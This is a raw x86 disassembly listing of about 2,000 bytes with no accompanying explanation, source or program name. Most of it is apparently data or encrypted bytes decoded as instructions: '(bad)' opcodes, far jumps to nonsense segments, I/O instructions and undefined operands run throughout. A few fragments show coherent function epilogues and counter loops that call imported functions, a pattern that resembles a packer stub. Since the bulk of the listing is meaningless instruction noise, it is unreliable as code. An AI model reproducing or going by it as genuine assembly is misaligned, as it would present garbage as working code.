  404021:	scas   eax,DWORD PTR es:[edi]
  404022:	(bad)  
  404023:	dec    edi
  404024:	nop
  404025:	popa   
  404026:	sub    BYTE PTR [edi+0x28],0xf7
  40402a:	jp     0x404049
  40402c:	jg     0x40404a
  40402e:	das    
  40402f:	sub    DWORD PTR [ebx+0x35e51268],ebp
  404035:	jae    0x40400e
  404037:	push   cs
  404038:	call   0xa25a7851
  40403d:	mov    cl,BYTE PTR [ebp+0x1e736068]
  404043:	call   0x9005c1c4
  404048:	adc    al,BYTE PTR [edi+0x12]
  40404b:	cmc    
  40404c:	pusha  
  40404d:	dec    ebp
  40404e:	or     ah,cl
  404050:	lock jmp 0xc717:0x3738d7d5
  404058:	dec    ebp
  404059:	push   ds
  40405a:	pop    ebx
  40405b:	push   cs
  40405c:	and    al,0xff
  40405e:	retf   0xef7c
  404061:	repnz sub DWORD PTR [edi+0x14],ecx
  404065:	lock cmp eax,0x5bc84a49
  40406b:	or     bl,ch
  40406d:	inc    edi
  40406e:	xchg   BYTE PTR [eax+0x5b600cdb],dl
  404074:	aam    0xfe
  404076:	enter  0xa524,0x5a
  40407a:	movnti DWORD PTR [esi-0x8969fd5],eax
  404081:	mov    WORD PTR ds:0x9b7cc4e9,gs
  404087:	mov    ebx,0x75b032d7
  40408c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40408d:	lods   eax,DWORD PTR ds:[esi]
  40408e:	in     al,dx
  40408f:	or     dh,BYTE PTR [edi-0x11108305]
  404095:	(bad)  
  404096:	loope  0x40404f
  404098:	cdq    
  404099:	ret    0x1e42
  40409c:	les    esp,FWORD PTR [ebp+0x51723bfb]
  4040a2:	lea    esp,[esi]
  4040a4:	push   0x44
  4040a6:	(bad)  
  4040a7:	cmc    
  4040a8:	cdq    
  4040a9:	or     ch,BYTE PTR [edx-0x43]
  4040ac:	inc    eax
  4040ad:	out    0x86,eax
  4040af:	(bad)  
  4040b0:	(bad)  
  4040b1:	xlat   BYTE PTR ds:[ebx]
  4040b2:	xchg   BYTE PTR [edi-0x3d],dl
  4040b5:	mov    ss:0x413dfb06,al
  4040bb:	fadd   DWORD PTR ds:0x8ef47581
  4040c1:	std    
  4040c2:	add    eax,0x2b7e900
  4040c7:	add    BYTE PTR [eax],al
  4040c9:	mov    eax,DWORD PTR [ebp-0x8]
  4040cc:	mov    ecx,DWORD PTR [ebp-0x18]
  4040cf:	mov    ecx,DWORD PTR [ecx]
  4040d1:	jmp    0x404370
  4040d6:	aas    
  4040d7:	leave  
  4040d8:	enter  0xdac9,0xd9
  4040dc:	fxch   st(1)
  4040de:	mov    eax,0x37f7e6c1
  4040e3:	sahf   
  4040e4:	out    dx,ax
  4040e6:	sahf   
  4040e7:	es js  0x404162
  4040ea:	(bad)  
  4040eb:	jle    0x404165
  4040ed:	js     0x4040c0
  4040ef:	imul   edi,edi,0x358dce14
  4040f5:	add    ch,BYTE PTR [edi]
  4040f7:	xchg   esi,eax
  4040f8:	push   eax
  4040f9:	add    al,BYTE PTR [ebp+0x45]
  4040fc:	enter  0x3f61,0xf2
  404100:	outs   dx,BYTE PTR ds:[esi]
  404101:	sbb    edi,DWORD PTR [ebx]
  404103:	arpl   WORD PTR [ecx+0x38ea797],sp
  404109:	imul   ebp,ebx,0xc36490e7
  40410f:	rcr    DWORD PTR [edx],1
  404111:	xchg   ecx,eax
  404112:	or     BYTE PTR [esi-0xb],dh
  404115:	push   0xffffff8d
  404117:	inc    esi
  404118:	outs   dx,BYTE PTR ds:[esi]
  404119:	popa   
  40411a:	push   esp
  40411b:	or     esi,DWORD PTR [esi+0x6f]
  40411e:	mov    dh,0x50
  404120:	rcr    DWORD PTR [edi],0xde
  404123:	out    dx,eax
  404124:	push   esp
  404125:	xchg   edi,eax
  404126:	lea    eax,[eax-0x53]
  404129:	je     0x4040db
  40412b:	sar    DWORD PTR [ebp+ecx*4+0x5c1c94ea],0x8b
  404133:	sbb    eax,0xbbda3c98
  404138:	push   ss
  404139:	pop    ebp
  40413a:	mov    cl,0x87
  40413c:	imul   eax,edi,0x750a99b4
  404142:	mov    ah,0x98
  404144:	cmp    al,0x50
  404146:	sub    edx,ebp
  404148:	add    al,0x93
  40414a:	xchg   edx,eax
  40414b:	fcomp  QWORD PTR [eax-0x6fd1e4c9]
  404151:	mov    edi,0x749dd2c2
  404156:	xor    BYTE PTR fs:[edi+0x7c56b1cb],bh
  40415d:	sbb    eax,0x6c185eb8
  404162:	mov    BYTE PTR [eax],ah
  404164:	push   es
  404165:	push   es
  404166:	das    
  404167:	hlt    
  404168:	or     esp,DWORD PTR [ebp+0x56a97bce]
  40416e:	sar    al,1
  404170:	mov    eax,ds:0x6da914b8
  404175:	inc    edx
  404176:	dec    eax
  404177:	mov    esp,?
  404179:	(bad)  
  40417a:	icebp  
  40417b:	jnp    0x404170
  40417d:	or     eax,DWORD PTR [eax-0x65f8d49d]
  404183:	gs clc 
  404185:	(bad)  
  404186:	xor    eax,0xbbd46884
  40418b:	lock mov bl,0x68
  40418e:	push   ebp
  40418f:	sar    DWORD PTR [edx],1
  404191:	jmp    0xb530:0x6ccc4498
  404198:	inc    edi
  404199:	add    ah,BYTE PTR [eax]
  40419b:	fisttp QWORD PTR [eax+0x44185a1e]
  4041a1:	pop    esi
  4041a2:	int    0xbb
  4041a4:	pop    ds
  4041a5:	popa   
  4041a6:	xor    bh,al
  4041a8:	or     ebx,DWORD PTR [edx]
  4041aa:	rcr    BYTE PTR [ecx],1
  4041ac:	xchg   DWORD PTR [ecx+0x1101c8cc],esi
  4041b2:	jnp    0x404205
  4041b4:	mov    cl,0xa2
  4041b6:	push   esi
  4041b7:	push   cs
  4041b8:	mov    al,BYTE PTR [esi]
  4041ba:	pop    esp
  4041bb:	and    bh,BYTE PTR [ecx]
  4041bd:	add    eax,0xfee34a50
  4041c2:	xchg   esi,eax
  4041c3:	xchg   esp,eax
  4041c4:	add    DWORD PTR [edi],edx
  4041c6:	mov    ss,WORD PTR [ebx+ecx*1]
  4041c9:	cmp    BYTE PTR [ecx+0xe],0xb5
  4041cd:	dec    ebp
  4041ce:	cmp    esi,DWORD PTR [esi+0x49]
  4041d1:	js     0x4041cc
  4041d3:	mov    ds:0x3336f57e,eax
  4041d8:	cld    
  4041d9:	stos   BYTE PTR es:[edi],al
  4041da:	arpl   WORD PTR [edi+0x3e395290],dx
  4041e0:	xchg   ecx,eax
  4041e1:	bswap  edi
  4041e3:	data16 jp 0x404174
  4041e6:	arpl   WORD PTR [eax],cx
  4041e8:	add    BYTE PTR [ebx],bh
  4041ea:	ret    
  4041eb:	sbb    al,BYTE PTR [edx+0x5dbe8d61]
  4041f1:	(bad)  
  4041f2:	mov    edx,0x7e9279fc
  4041f7:	mov    esi,0x47de174d
  4041fc:	cwde   
  4041fd:	rol    BYTE PTR [ebx+0x44],1
  404200:	addr16 (bad) 
  404202:	sahf   
  404203:	xchg   ecx,eax
  404204:	in     eax,dx
  404205:	or     DWORD PTR [eax+0x20],eax
  404208:	aad    0x8a
  40420a:	pop    edx
  40420b:	cmp    BYTE PTR [edx],ah
  40420d:	js     0x4041b8
  40420f:	mov    ah,0x23
  404211:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404212:	adc    ecx,ebp
  404214:	push   ebp
  404215:	hlt    
  404216:	add    al,0x9
  404218:	sbb    BYTE PTR ds:0xbd1c2b20,ah
  40421e:	push   ds
  40421f:	in     al,0x11
  404221:	stos   BYTE PTR es:[edi],al
  404222:	add    BYTE PTR [esi-0x48],al
  404225:	push   0x6
  404227:	in     eax,0xc0
  404229:	cs stc 
  40422b:	js     0x4041bd
  40422d:	push   ebp
  40422e:	mov    ecx,0x347c5905
  404233:	xchg   DWORD PTR [ecx+0x2955191b],esi
  404239:	fld    TBYTE PTR [edi]
  40423b:	aad    0xf0
  40423d:	lods   eax,DWORD PTR ds:[esi]
  40423e:	adc    DWORD PTR [edx-0x6e4c2636],ebx
  404244:	xor    DWORD PTR [esp+esi*4-0x36],edx
  404248:	sbb    al,0x1f
  40424a:	jmp    0x7564:0xcb571b60
  404251:	ret    
  404252:	mov    esi,0x7faa9282
  404257:	or     esi,DWORD PTR [esp+edi*1]
  40425a:	lods   eax,DWORD PTR ds:[esi]
  40425b:	dec    esp
  40425c:	pop    esp
  40425d:	push   ecx
  40425e:	or     BYTE PTR [ebx+ecx*2-0x50],bh
  404262:	mov    esp,0x5ae86f4f
  404268:	or     al,0x60
  40426a:	cmp    BYTE PTR [edx+0x41],cl
  40426d:	jl     0x404243
  40426f:	shr    DWORD PTR [ebp-0x40c39869],1
  404275:	aas    
  404276:	and    BYTE PTR [eax-0x5e],cl
  404279:	cmp    BYTE PTR [edi+0x6b],bh
  40427c:	shr    BYTE PTR [ecx],cl
  40427e:	out    0x7d,eax
  404280:	mov    esp,0xb2a580c5
  404285:	loop   0x40427b
  404287:	push   ss
  404288:	(bad)  
  404289:	sub    dl,dh
  40428b:	lds    esi,FWORD PTR [esi]
  40428d:	(bad)  
  40428f:	jmp    0x404287
  404291:	dec    edi
  404292:	xchg   esp,eax
  404293:	and    DWORD PTR ds:0x2ef1e8f0,0xdfcbd931
  40429d:	mov    ds:0x37398e0b,al
  4042a2:	sub    ah,BYTE PTR es:[ecx+eax*2-0x7c9d228d]
  4042aa:	pop    edi
  4042ab:	jecxz  0x4042da
  4042ad:	lea    ebx,[ebx+0x36652b05]
  4042b3:	in     eax,dx
  4042b4:	push   ss
  4042b5:	shl    BYTE PTR [esi-0x3ac36650],cl
  4042bb:	ins    DWORD PTR es:[edi],dx
  4042bc:	mov    ch,0x20
  4042be:	mov    cl,0xe8
  4042c0:	mov    eax,ds:0x8111fd17
  4042c5:	pushf  
  4042c6:	cmp    BYTE PTR [edx],ch
  4042c8:	sbb    WORD PTR [esi+0x46656c2f],cx
  4042cf:	outs   dx,DWORD PTR ds:[esi]
  4042d0:	mov    ecx,0x2f9ad497
  4042d5:	dec    ecx
  4042d6:	ror    DWORD PTR [edx-0xe],0x82
  4042da:	cld    
  4042db:	mov    edi,0xc46ea119
  4042e0:	cmp    BYTE PTR [eax],dl
  4042e2:	test   DWORD PTR es:[ecx+0x71599d9b],eax
  4042e9:	or     BYTE PTR [eax-0x14f062a9],al
  4042ef:	call   DWORD PTR [edi-0x5cf3bf18]
  4042f5:	test   al,0xa3
  4042f7:	and    ebp,ebp
  4042f9:	popf   
  4042fa:	mov    ah,0xa3
  4042fc:	cdq    
  4042fd:	adc    edi,DWORD PTR ds:0x8fa1d8bb
  404303:	jns    0x40433f
  404305:	es dec edx
  404307:	and    DWORD PTR [edi],ebx
  404309:	fcomp  QWORD PTR [edx+edi*1-0x67325b41]
  404310:	pop    ds
  404311:	jae    0x40430d
  404313:	lea    esp,[ecx]
  404315:	aad    0x1d
  404317:	int    0x78
  404319:	inc    esp
  40431a:	popa   
  40431b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40431c:	in     al,dx
  40431d:	rcl    DWORD PTR [edx],1
  40431f:	xchg   BYTE PTR [ebx+0xc751dda],dh
  404325:	mov    edx,0xd24d2893
  40432a:	test   eax,0x5b27384a
  40432f:	ds and al,0xac
  404332:	test   DWORD PTR [ebx],0xf08aab9c
  404338:	xor    al,0x4d
  40433a:	(bad)  
  40433b:	sti    
  40433c:	mov    eax,ds:0x96eff295
  404341:	mov    ds:0x14b6bedc,al
  404346:	jmp    0x4042df
  404348:	add    al,bh
  40434a:	sbb    DWORD PTR [esi-0x5b],0x2079cb81
  404351:	mov    ecx,0x813ac94e
  404356:	(bad)  
  404357:	lock dec edx
  404359:	push   esp
  40435a:	and    esi,DWORD PTR [ebx+0x19]
  40435d:	imul   edi,esi,0xffffffcc
  404360:	int3   
  404361:	sub    DWORD PTR [edi-0x21],esp
  404364:	test   DWORD PTR [eax+0x51f85eb2],edi
  40436a:	mov    ecx,0x33fce165
  40436f:	adc    al,0x89
  404371:	or     BYTE PTR [ebx+0x458b0c45],cl
  404377:	or     bh,bh
  404379:	jne    0x404373
  40437b:	call   0x4096cf
  404380:	mov    eax,DWORD PTR [ebp-0xc]
  404383:	cmp    eax,ebx
  404385:	je     0x401faa
  40438b:	mov    eax,DWORD PTR [ebp-0x8]
  40438e:	mov    eax,DWORD PTR [eax]
  404390:	pop    edi
  404391:	pop    esi
  404392:	pop    ebx
  404393:	leave  
  404394:	ret    0xc
  404397:	push   ebp
  404398:	mov    ebp,esp
  40439a:	sub    esp,0x14
  40439d:	leave  
  40439e:	ret    0x4
  4043a1:	push   ebp
  4043a2:	mov    ebp,esp
  4043a4:	push   ecx
  4043a5:	mov    eax,ds:0x42a77d
  4043aa:	add    DWORD PTR ds:0x42a761,eax
  4043b0:	push   ecx
  4043b1:	xor    ecx,0x7913
  4043b7:	mov    eax,0xf89c8538
  4043bc:	and    DWORD PTR ds:0x42a7b5,0x0
  4043c6:	mov    ecx,DWORD PTR ds:0x42a7b5
  4043cc:	inc    ecx
  4043cd:	mov    DWORD PTR ds:0x42a7b5,ecx
  4043d3:	cmp    DWORD PTR ds:0x42a7b5,0x23
  4043da:	jne    0x4043e6
  4043e0:	call   DWORD PTR ds:0x41d240
  4043e6:	cmp    DWORD PTR ds:0x42a7b5,0x15
  4043ed:	jb     0x4043c6
  4043f3:	mov    DWORD PTR [ebp-0x8],eax
  4043f6:	dec    DWORD PTR ds:0x42a845
  4043fc:	mov    DWORD PTR [ebp-0x4],0xf89c8539
  404403:	mov    edx,DWORD PTR [ebp-0x8]
  404406:	not    ecx
  404408:	jmp    0x4046f8
  40440d:	rol    edi,0x3f
  404410:	retf   
  404411:	leave  
  404412:	retf   
  404413:	leave  
  404414:	lds    edx,FWORD PTR [edx]
  404416:	dec    esp
  404417:	inc    ecx
  404418:	ins    BYTE PTR es:[edi],dx
  404419:	sbb    ebp,DWORD PTR [bp+si]
  40441c:	mov    dh,0x1c
  40441e:	sub    edi,DWORD PTR [eax+0x78]
  404421:	dec    ebp
  404422:	jle    0x40449c
  404424:	js     0x40442b
  404426:	pop    esi
  404427:	mov    cl,0x3d
  404429:	jae    0x40445d
  40442b:	ds push ebx
  40442d:	sub    eax,0x4d0dffe3
  404432:	daa    
  404433:	or     eax,0xa18f5494
  404438:	add    al,0xbf
  40443a:	stos   BYTE PTR es:[edi],al
  40443b:	xor    esp,DWORD PTR [ebx]
  40443d:	xor    DWORD PTR [ebx-0x23],ebp
  404440:	ss aas 
  404442:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404443:	pop    ebx
  404444:	add    bh,0x7f
  404447:	add    edi,eax
  404449:	jmp    0x40445c
  40444b:	ss mov dh,0xdc
  40444e:	popf   
  40444f:	xchg   BYTE PTR [ecx+0x2d],bh
  404452:	sub    BYTE PTR [ebp+0x2303744f],dl
  404458:	sub    ebp,DWORD PTR [edx+0x6fa74949]
  40445e:	inc    ebx
  40445f:	daa    
  404460:	and    al,0xdc
  404462:	sub    BYTE PTR [esi-0x52],cl
  404465:	sti    
  404466:	fs scas eax,DWORD PTR es:[edi]
  404468:	pop    ebx
  404469:	jno    0x40440f
  40446b:	scas   al,BYTE PTR es:[edi]
  40446c:	push   eax
  40446d:	sub    BYTE PTR [eax-0x22],bl
  404470:	mov    dh,0xe1
  404472:	dec    edi
  404473:	cmc    
  404474:	jne    0x4044d8
  404476:	and    dl,dl
  404478:	lock xor BYTE PTR [esp+esi*1+0x7],0x55
  40447e:	popf   
  40447f:	sub    dl,BYTE PTR [edx]
  404481:	aad    0xff
  404483:	leave  
  404484:	push   ss
  404485:	ds pusha 
  404487:	ins    BYTE PTR es:[edi],dx
  404488:	xchg   ecx,eax
  404489:	add    al,0x68
  40448b:	popa   
  40448c:	add    ch,ah
  40448e:	ja     0x404432
  404490:	lods   al,BYTE PTR ds:[esi]
  404491:	mov    al,ds:0x8e6b33e8
  404496:	nop
  404497:	sub    bh,BYTE PTR [edx]
  404499:	(bad)  
  40449a:	mov    ?,WORD PTR [ebp+edx*8+0x6c]
  40449e:	into   
  40449f:	cmp    al,0x96
  4044a1:	int    0x7e
  4044a3:	push   ss
  4044a4:	dec    ebx
  4044a5:	test   DWORD PTR [ebx+0x43],0xcc3b7543
  4044ac:	xor    DWORD PTR [edi],eax
  4044ae:	in     al,dx
  4044af:	test   eax,0xc19e8383
  4044b4:	push   edx
  4044b5:	mov    al,0x4e
  4044b7:	mov    esi,0x73052dec
  4044bc:	jbe    0x404453
  4044be:	clc    
  4044bf:	jecxz  0x404476
  4044c1:	daa    
  4044c2:	repz dec esi
  4044c4:	xchg   edx,eax
  4044c5:	sub    edx,edx
  4044c7:	xchg   bl,bl
  4044c9:	xchg   ebx,eax
  4044ca:	xchg   esp,esp
  4044cc:	pop    esp
  4044cd:	sbb    BYTE PTR [esi],dl
  4044cf:	mov    dh,0xe2
  4044d1:	jb     0x4044d7
  4044d3:	lds    esp,FWORD PTR [ebx+0x1d]
  4044d6:	cdq    
  4044d7:	dec    edi
  4044d8:	arpl   WORD PTR [esi-0x3c9bf64c],dx
  4044de:	ds dec eax
  4044e0:	in     al,0x1e
  4044e2:	mov    BYTE PTR [ebp+0x34f43bc9],ch
  4044e8:	lahf   
  4044e9:	inc    esp
  4044ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4044eb:	fdiv   QWORD PTR [eax+0x6ae08ed]
  4044f1:	std    
  4044f2:	std    
  4044f3:	push   es
  4044f4:	aad    0x1a
  4044f6:	adc    dl,BYTE PTR [edx-0x17]
  4044f9:	and    ebp,DWORD PTR [eax-0x36f1609b]
  4044ff:	xchg   edi,eax
  404500:	(bad)  [esi-0x34]
  404503:	add    al,0x64
  404505:	dec    edi
  404506:	imul   edi,DWORD PTR [edx],0x21d22d98
  40450c:	cli    
  40450d:	adc    edx,edx
  40450f:	push   eax
  404510:	and    bl,BYTE PTR [esi]
  404512:	stos   DWORD PTR es:[edi],eax
  404513:	mov    BYTE PTR [ecx+0x9],dl
  404516:	sub    al,BYTE PTR [ebx-0x35]
  404519:	arpl   di,ax
  40451b:	int3   
  40451c:	pop    edi
  40451d:	push   0x7a
  40451f:	xchg   esi,eax
  404520:	mov    ss,eax
  404522:	mov    eax,ds:0xbfb2d3b3
  404527:	cmp    dl,BYTE PTR [edi+0x58f4d599]
  40452d:	mov    ebp,0x5f136382
  404532:	nop    DWORD PTR [edx]
  404535:	sahf   
  404536:	mov    al,0x2f
  404538:	ret    
  404539:	xchg   BYTE PTR [ebp+0x630c26da],dl
  40453f:	dec    esi
  404540:	lea    ebx,[esi]
  404542:	repnz enter 0x2398,0xa2
  404547:	mov    al,ds:0x67c30dee
  40454c:	pop    DWORD PTR [ebx-0xf17211a]
  404552:	imul   edi,esp,0x48
  404555:	pop    ds
  404556:	push   esi
  404557:	call   0x32d3:0xe19a126b
  40455e:	test   bl,bl
  404560:	cmp    BYTE PTR [edi+0x24],cl
  404563:	sahf   
  404564:	nop
  404565:	or     BYTE PTR [edi+0x52367efb],0x43
  40456c:	or     DWORD PTR [edi+0x2c917efc],esi
  404572:	mov    al,ds:0xdfe22b3
  404577:	mov    ch,0x1e
  404579:	retf   0xb856
  40457c:	inc    ebx
  40457d:	sar    edi,cl
  40457f:	xor    eax,0x1a46a8f8
  404584:	imul   esp,DWORD PTR [esi],0xffffffa3
  404587:	adc    ebx,ecx
  404589:	jb     0x4045ee
  40458b:	cmp    ch,BYTE PTR [ebx]
  40458d:	test   al,0x8
  40458f:	push   0x3a986d1b
  404594:	retf   0x9bdb
  404597:	mov    cl,0x64
  404599:	jmp    FWORD PTR [edx+0x5a]
  40459c:	scas   eax,DWORD PTR es:[edi]
  40459d:	mov    gs,edi
  40459f:	lds    esi,FWORD PTR [edi]
  4045a1:	jnp    0x404601
  4045a3:	cmp    ax,0xaaf6
  4045a7:	lods   al,BYTE PTR ds:[esi]
  4045a8:	add    al,0xbd
  4045aa:	aas    
  4045ab:	popa   
  4045ac:	cmp    ebx,DWORD PTR [ebp+0x5a]
  4045af:	push   cs
  4045b0:	dec    edx
  4045b1:	jmp    0x1420:0xfa88431
  4045b8:	repz imul edi,ebp
  4045bc:	sub    bh,BYTE PTR ds:0xb32c1f20
  4045c2:	pop    esp
  4045c3:	std    
  4045c4:	icebp  
  4045c5:	outs   dx,BYTE PTR ds:[esi]
  4045c6:	push   edx
  4045c7:	dec    ebx
  4045c8:	rol    DWORD PTR [eax+0x6],0x72
  4045cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4045cd:	ja     0x40462f
  4045cf:	mov    ebp,DWORD PTR [eax+0x22]
  4045d2:	sub    BYTE PTR [edx+esi*1],dl
  4045d5:	sahf   
  4045d6:	push   ecx
  4045d7:	and    ecx,DWORD PTR [edi+0x2a]
  4045da:	or     DWORD PTR [esi],0x48
  4045dd:	sbb    ecx,DWORD PTR [ebp+0x58e2bf55]
  4045e3:	das    
  4045e4:	or     ah,al
  4045e6:	mov    edi,0xcea812d6
  4045eb:	mov    ebx,0x884fb370
  4045f0:	jge    0x4045d1
  4045f2:	iret   
  4045f3:	push   esi
  4045f4:	mov    dh,0xcb
  4045f6:	cli    
  4045f7:	sbb    eax,DWORD PTR ds:0xb922825a
  4045fd:	rcl    DWORD PTR [esi+ebp*1-0x5675b3dd],0xdb
  404605:	jle    0x404635
  404607:	dec    ecx
  404608:	das    
  404609:	push   cs
  40460a:	mov    WORD PTR [ecx-0x145986f4],ss
  404610:	add    BYTE PTR [ebp-0x71],cl
  404613:	je     0x404662
  404615:	dec    esp
  404616:	pop    edi
  404617:	jmp    0x4045a7
  404619:	out    0x74,al
  40461b:	and    eax,0x16b3d560
  404620:	xor    BYTE PTR [esi+ecx*8-0x40],0xe3
  404625:	cli    
  404626:	daa    
  404627:	xchg   ebp,eax
  404628:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404629:	(bad)  
  40462a:	pop    edi
  40462b:	add    dl,BYTE PTR ds:0xdfd91280
  404631:	xlat   BYTE PTR ds:[ebx]
  404632:	call   0x1ebd:0x66bf7fb2
  404639:	xchg   BYTE PTR [ecx],ch
  40463b:	pop    ss
  40463c:	lods   eax,DWORD PTR ds:[esi]
  40463d:	sahf   
  40463e:	data16 (bad) 
  404641:	aaa    
  404642:	(bad)  
  404643:	or     dh,bh
  404645:	sbb    bl,BYTE PTR ds:0xbd7cf886
  40464b:	sub    eax,0xb21af9d0
  404650:	xchg   ebx,eax
  404651:	or     DWORD PTR [esi],0xffffffe8
  404654:	add    DWORD PTR [ebx],ebp
  404656:	mov    BYTE PTR [ecx],ah
  404658:	scas   eax,DWORD PTR es:[edi]
  404659:	jmp    0xce89:0xc42a2554
  404660:	int3   
  404661:	mov    edi,0xd5856a17
  404666:	or     dl,BYTE PTR [eax]
  404668:	adc    al,BYTE PTR [ebx-0x29b39b63]
  40466e:	push   ss
  40466f:	dec    esp
  404670:	sub    DWORD PTR [ecx],edi
  404672:	mov    eax,ds:0x640ab80d
  404677:	sbb    ebx,ebp
  404679:	mov    al,ds:0x2c211ce1
  40467e:	shr    BYTE PTR [ecx],0xe6
  404681:	push   edi
  404682:	mov    bh,BYTE PTR [ebp-0x59]
  404685:	pushf  
  404686:	ins    DWORD PTR es:[edi],dx
  404687:	jecxz  0x404691
  404689:	pop    esp
  40468a:	bound  eax,QWORD PTR [ebx]
  40468c:	push   0x62690b5c
  404691:	and    dl,al
  404693:	adc    eax,0x19
  404696:	and    DWORD PTR [esi-0x6b],edi
  404699:	push   ds
  40469a:	outs   dx,DWORD PTR ds:[esi]
  40469b:	cld    
  40469c:	in     eax,dx
  40469d:	popf   
  40469e:	fdivr  QWORD PTR [ebp-0x5f]
  4046a1:	out    0x86,eax
  4046a3:	ret    
  4046a4:	mov    edi,eax
  4046a6:	mov    eax,ecx
  4046a8:	pop    esp
  4046a9:	scas   al,BYTE PTR es:[edi]
  4046aa:	repnz out 0x53,eax
  4046ad:	xchg   DWORD PTR [ebx],ebx
  4046af:	gs loopne 0x404667
  4046b2:	pop    ebp
  4046b3:	sbb    eax,0x5d50d43f
  4046b8:	and    eax,0xd61145b4
  4046bd:	sub    al,0x12
  4046bf:	cli    
  4046c0:	sbb    BYTE PTR [edi+ebx*2],al
  4046c3:	rol    ch,1
  4046c5:	outs   dx,DWORD PTR ds:[esi]
  4046c6:	rol    esi,0x43
  4046c9:	loop   0x4046db
  4046cb:	jmp    0x8faa:0xa2f8a4ce
  4046d2:	mov    ah,0x77
  4046d4:	mov    ds:0x96dd5885,al
  4046d9:	pop    eax
  4046da:	int    0xb3
  4046dc:	ret    0xcbba
  4046df:	jmp    0x822:0xa70bf531
  4046e6:	jle    0x404685
  4046e8:	jns    0x404704
  4046ea:	pop    es
  4046eb:	jge    0x404760
  4046ed:	pushf  
  4046ee:	sbb    eax,0xc164295f
  4046f3:	out    0xcc,eax
  4046f5:	dec    edi
  4046f6:	jecxz  0x4046b7
  4046f8:	push   esi
  4046f9:	and    DWORD PTR ds:0x42a775,0x0
  404703:	jmp    0x404715
  404708:	mov    esi,DWORD PTR ds:0x42a775
  40470e:	inc    esi
  40470f:	mov    DWORD PTR ds:0x42a775,esi
  404715:	cmp    DWORD PTR ds:0x42a775,0x10
  40471c:	jae    0x404a4d
  404722:	cmp    DWORD PTR ds:0x42a775,0x16
  404729:	jne    0x404752
  40472f:	push   DWORD PTR [ebp-0x1c]
  404732:	push   DWORD PTR [ebp-0xc]
  404735:	push   DWORD PTR [ebp-0x18]
  404738:	push   0x42a83d
  40473d:	push   0x2e4d
  404742:	push   0x244d
  404747:	push   0x42aa48
  40474c:	call   DWORD PTR ds:0x41d0c0
  404752:	jmp    0x404708
  404757:	xor    esi,0x7852
  40475d:	jmp    0x404a4d
  404762:	rol    eax,1
  404764:	int3   
  404765:	(bad)  
  404766:	(bad)  
  404768:	(bad)  
  40476a:	pop    esi
  40476b:	test   eax,0x2c0f83de
  404770:	sub    al,bh
  404772:	jno    0x40479d
  404774:	js     0x4047ee
  404776:	dec    ebp
  404777:	jle    0x4047f1
  404779:	js     0x4047be
  40477b:	jp     0x4047ad
  40477d:	jns    0x404754
  40477f:	fsubr  QWORD PTR [edi]
  404781:	jmp    0x9d0d:0x701eebd8
  404788:	mov    bl,0x79
  40478a:	sub    eax,0xf18c2120
  40478f:	(bad)
  404793:	jg     0x4047f6
  404795:	mov    esp,0xee518b9f
  40479a:	sbb    BYTE PTR ds:0xe33747d6,al
  4047a0:	fisub  WORD PTR [ebx]
  4047a2:	dec    edx
  4047a3:	fldl2t 
  4047a5:	sbb    dh,BYTE PTR ss:[edi+0x1]
  4047a9:	sub    dl,0xeb
  4047ac:	dec    esi
  4047ad:	push   esi
  4047ae:	lods   eax,DWORD PTR ds:[esi]
  4047af:	fs mov eax,0x7d1873d8
  4047b5:	xchg   DWORD PTR [ebx+0x17b6d4a6],ecx
  4047bb:	dec    esi
  4047bc:	add    BYTE PTR [edi+0x1e9a42],0xe1
  4047c3:	pop    es
  4047c4:	xchg   ecx,eax
  4047c5:	push   0x12
  4047c7:	cmp    ah,BYTE PTR [edx+0x723961ee]
  4047cd:	dec    esp
  4047ce:	lock pop es
  4047d0:	add    edi,DWORD PTR fs:[bx+di-0x6617]
  4047d6:	ds xchg ebx,eax
  4047d8:	out    dx,al
  4047d9:	mov    ebx,0x59722c87
  4047de:	rcl    ebx,cl
  4047e0:	jb     0x4047f3
  4047e2:	jge    0x4047a5
  4047e4:	inc    edi
  4047e5:	mov    ?,WORD PTR [edi+0x7509684d]
  4047eb:	dec    edi
  4047ec:	into   
  4047ed:	xchg   esp,eax
  4047ee:	enter  0xf0c,0xab
  4047f2:	push   ebp
  4047f3:	mul    edi
  4047f5:	out    0x53,eax
  4047f7:	cmp    ebx,ecx
  4047f9:	adc    DWORD PTR [ebp+0x2d7a32cf],ebx
  4047ff:	pop    ecx
  404800:	or     DWORD PTR [esi-0x55],ebx
  404803:	bound  ebx,QWORD PTR [esi+0x76bf227a]
  404809:	jbe    0x404790
  40480b:	loope  0x40480f
  40480d:	inc    edx
  40480e:	adc    edi,esi
  404810:	add    dh,BYTE PTR [edx+0x49975203]
  404816:	aad    0x53
  404818:	(bad)  
  404819:	enter  0x4516,0xfe
  40481d:	into   
  40481e:	sbb    BYTE PTR [eax-0x7f],ch
  404821:	mov    esi,0x947810e1
  404826:	xchg   ebx,eax
  404827:	jl     0x40483e
  404829:	cmp    eax,0xea281f29
  40482e:	repnz (bad) 
  404831:	int    0xd
  404833:	call   0x2105169
  404838:	jno    0x404883
  40483a:	jmp    0x46dacd60
  40483f:	push   cs
  404840:	and    BYTE PTR [ebx+eiz*8+0x54],0x14
  404845:	push   esi
  404846:	and    BYTE PTR ds:[eax-0x535c4146],dh
  40484d:	push   es
  40484e:	ss xchg ebx,eax
  404850:	cmp    dh,dl
  404852:	mov    bh,0x6f
  404854:	int3   
  404855:	mov    edx,0xa2066900
  40485a:	push   esi
  40485b:	inc    cl
  40485d:	inc    ecx
  40485e:	inc    ebx
  40485f:	ret    
  404860:	pop    ds
  404861:	repnz shl DWORD PTR [ecx+0x69],0x37
  404866:	call   0x2ca4ee8
  40486b:	mov    edx,0x1e039668
  404870:	and    DWORD PTR [ebx],esi
  404872:	fdivp  st(2),st
  404874:	std    
  404875:	repz in eax,0xf8
  404878:	aad    0x7a
  40487a:	int3   
  40487b:	sbb    eax,DWORD PTR [esi+0x2a]
  40487e:	lods   eax,DWORD PTR ds:[esi]
  40487f:	pop    eax
  404880:	inc    esp
  404881:	xchg   esi,eax
  404882:	sahf   
  404883:	pop    ebp
  404884:	je     0x4048c3
  404886:	scas   eax,DWORD PTR es:[edi]
  404887:	loopne 0x4048ec
  404889:	repz dec esp
  40488b:	dec    ebx
  40488c:	add    edi,esp
